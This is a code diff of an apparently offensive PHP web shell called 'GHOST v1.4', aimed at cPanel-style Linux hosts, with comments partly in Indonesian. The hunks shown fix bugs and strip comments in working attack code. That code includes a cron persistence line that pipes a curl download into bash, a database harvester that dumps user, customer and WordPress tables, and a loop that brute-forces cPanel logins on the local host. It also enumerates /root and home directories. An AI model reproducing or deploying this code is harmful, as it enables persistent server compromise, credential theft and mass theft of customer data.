@@ -1,16 +1,9 @@
 <?php
 /**
- * GHOST v1.4 — Loader-Aware Edition
+ * GHOST v1.4 — Loader-Aware Edition (Final & Fixed UI)
  * target: Linux + Apache/LiteSpeed + cPanel-style
  * php:    7.4+
  * author: VANTA / dj
- *
- * CHANGELOG v1.4
- *  - fix: document root resolution when executed via remote loader (/tmp)
- *  - fix: persistent auto_prepend_file points to real loader filename
- *  - fix: bashrc persistence covers .profile and .bash_profile (non-interactive)
- *  - fix: cPanel auto_pwn uses correct login endpoint (no login_only=1)
- *  - fix: db_harvest uses USE db before SHOW TABLES
  */
 
 // [00] HEADER
@@ -33,7 +26,7 @@ if (empty($doc_root) || !@is_dir($doc_root)) {
     $doc_root = @getcwd();
 }
 $GHOST_ROOT  = @realpath($doc_root) ?: $doc_root;
-// Jika dijalankan via loader, __FILE__ akan menunjuk ke /tmp/lop_xxx.php
+// Jika dijalankan via loader, __FILE__ akan menunjuk ke /tmp
 // Kita gunakan SCRIPT_FILENAME untuk mencari nama file loader aslinya
 $GHOST_SELF  = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');
 $GHOST_VER   = '1.4';
@@ -210,7 +203,7 @@ function ghost_h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
 function ghost_bytes($n) { $n = (float)$n; $u = ['B','KB','MB','GB','TB']; $i = 0; while ($n >= 1024 && $i < 4) { $n /= 1024; $i++; } return round($n, 2) . ' ' . $u[$i]; }
 function ghost_rand($n = 8) { return bin2hex(random_bytes((int)ceil($n/2))); }
 function ghost_csrf_ok() { $g = $_POST['csrf'] ?? $_GET['csrf'] ?? ''; return is_string($g) && $g !== '' && hash_equals($GLOBALS['GHOST_CSRF'], $g); }
-function ghost_home_dirs() { $homes = []; foreach ([@glob('/home/*', GLOBONLYDIR) ?: [], ['/root'], ['/var/www']] as $g) { foreach ($g as $h) { if ($h && @is_dir($h)) $homes[] = $h; } } return array_values(array_unique($homes)); }
+function ghost_home_dirs() { $homes = []; foreach ([@glob('/home/*', GLOB_ONLYDIR) ?: [], ['/root'], ['/var/www']] as $g) { foreach ($g as $h) { if ($h && @is_dir($h)) $homes[] = $h; } } return array_values(array_unique($homes)); }
 function ghost_deadline() { return time() + (int)GHOST_SAFETY_SECONDS; }
 function ghost_expired($dl) { return time() >= $dl; }
 
@@ -265,7 +258,8 @@ function ghost_respond($data, $code = 200) {
         @header('Cache-Control: no-store');
     }
     echo GHOST_MARK_BEGIN . $payload . GHOST_MARK_END;
-    exit;
+    // Ganti exit() dengan Exception agar loader bisa menangkap dan menghapus tmp
+    throw new Exception("GHOST_EXIT");
 }
 function ghost_json($d, $c = 200) { ghost_respond($d, $c); }
 
@@ -467,7 +461,7 @@ function ghost_db_harvest($cfg) {
     $dbs = []; $r = ghost_db_query($conn, 'SHOW DATABASES'); foreach ($r['rows'] as $row) $dbs[] = $row['Database'] ?? array_values($row)[0];
     $out = ['ok'=>true,'via'=>$conn['via'],'host'=>$conn['host'],'port'=>$conn['port'],'user'=>$conn['user'],'databases'=>$dbs,'tables'=>[],'tables_data'=>[]];
     if (!empty($cfg['db'])) {
-        ghost_db_query($conn, 'USE `' . str_replace('`','``',$cfg['db']) . '`'); // Fix: USE db first
+        ghost_db_query($conn, 'USE `' . str_replace('`','``',$cfg['db']) . '`');
         $r = ghost_db_query($conn, 'SHOW TABLES'); foreach ($r['rows'] as $row) $out['tables'][] = array_values($row)[0];
         foreach (['users','wp_users','customers','admin','members','accounts','wp_options'] as $tbl) {
             if (!in_array($tbl, $out['tables'], true)) continue;
@@ -576,7 +570,7 @@ function ghost_persist($method, $url = '', $caps = null) {
     $res = ['ok'=>false,'method'=>$method,'msg'=>'']; if (!$caps) $caps = ghost_caps();
     $user = $caps['user'] ?? 'root';
     $real_self = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');
-    
+
     switch ($method) {
         case 'cron':
             $cmd = 'curl -s ' . escapeshellarg((string)$url) . ' | bash'; $cron = "@reboot " . $cmd . "\n";
@@ -643,7 +637,6 @@ function ghost_auto_pwn($root, $caps = null) {
         $cp_user = $caps['user'] ?? '';
         foreach ([2082,2083] as $port) { if (ghost_expired($dl)) break; foreach ($creds as $pass) {
             if (ghost_expired($dl)) break;
-            // Fix cPanel login endpoint (no login_only=1)
             $ch = @curl_init("http://127.0.0.1:$port/login/"); 
             if (!$ch) continue;
             @curl_setopt_array($ch, [
